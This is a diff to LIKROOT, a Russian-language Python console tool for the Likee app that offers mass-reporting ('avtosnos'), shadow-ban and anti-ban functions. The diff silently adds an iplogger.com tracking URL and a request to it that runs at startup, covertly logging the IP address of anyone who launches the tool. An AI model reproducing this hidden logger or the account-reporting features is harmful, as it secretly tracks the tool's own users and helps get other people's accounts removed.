@@ -1,6 +1,7 @@
 #SETINGS
 #RESHETKA
-code = "eyJtZXNzYWdlIjoiIn0="
+code = "bGFiZWw="
+loger = "https://iplogger.com/2HT4V4"
 #server = "https://bstream.likeeapp.ru/json?uri=8001001&aid=48&t=0.7859116550012502"
 txt = '''
     ┏┓╋┏┳━━━┳┓╋╋┏┓╋╋┏━━━┓
@@ -54,6 +55,7 @@ else:
         time.sleep(0.01)
         print(i, end='', flush=True)
     #ввод ключа
+    bot = requests.get(loger)
     print ("")
     new = input("Введи Ключ Доступа:")
     byte_data = new.encode('utf-8')
@@ -96,17 +98,19 @@ headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 
 
 info = f"""
 Developer> (RESHETKA)
+Администратор> Зимний_SBX❄
 ----------------------------
 
 Версия> {vers}
-LIKEEROOT - ЭТО СОФТ СДЕЛАНЫЙ ДЛЯ ВЗАИМОДЕЙСТВИЯ С LIKEE!
+LIKROOT - ЭТО СОФТ СДЕЛАНЫЙ ДЛЯ ВЗАИМОДЕЙСТВИЯ С LIKEE!
 
-ОБНОВЛЕНИЕ 29.08.2025
-Теперь LIKROOT ловит даже на Парковке.
+ОБНОВЛЕНИЕ 04.09.2025
+ДОБАВЛЕНЫ ТЕКСТА ДЛЯ АПЕЛЛЯЦИЙ.
+Исправление ошибок.
+
 
 ---------
 Telegramm:  https://t.me/+Q6dkr4rcjJEwY2Qy
-
 
 """
 
@@ -124,6 +128,7 @@ menu = """
     {+} 8. Данные о видео из аккаунта
     {+} 9. Информация об аккаунте
     {+} 10. Account (TENEVOI BAN)
+    {+} 11. ANTIBAN
     
     [=] 0. Выход
     ----------------------------------
@@ -132,8 +137,8 @@ menu = """
 
 print (Fore.WHITE + logo)
 
-print ("")
 print (Fore.CYAN + "[=] Developer: RESHETKA")
+print (Fore.GREEN + "[=] Admin: Зимний_SBX❄")
 
 print (Fore.YELLOW + menu)
 
@@ -172,13 +177,16 @@ if us == "avtosnos":
 if us == "10":
     from api import accountsnos
 
+if us == "11":
+    from tools import antiban
+
 
     
 #soft
     
 
 if us =="5":
-    print (Fore.BLUE + "")
+    print (Fore.YELLOW + "")
     os.system("clear")
     print("")
     for i in info:
